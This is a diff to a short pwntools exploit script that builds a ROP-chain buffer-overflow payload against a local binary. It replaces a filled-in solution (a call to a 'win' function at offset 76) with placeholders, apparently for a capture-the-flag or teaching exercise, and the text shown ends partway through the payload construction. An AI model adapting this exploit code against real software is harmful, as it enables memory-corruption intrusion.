@@ -1,23 +1,25 @@
 #!/usr/bin/env python3
 
-import sys
 from pwn import *
-from itertools import cycle
 
 elf = ELF("./example")
 # set the base address, to combat PIE
 elf.address = elf.libs['/app/example']
 
-# Now, we can create our attack.
-## --------------
-
+# create a ropchain
 rop = ROP(elf)
-rop.win()
 
+########################################
 
-offset = 76 # This needs to be the offset for eip
+# This needs to be the function you want to call
+# <https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP>
+rop.funcname()
 
-## --------------
+# This needs to be the offset for eip.
+# Consider using create_table.py to find eip
+offset = ...
+
+########################################
 
 payload = flat({
     offset: rop.chain()
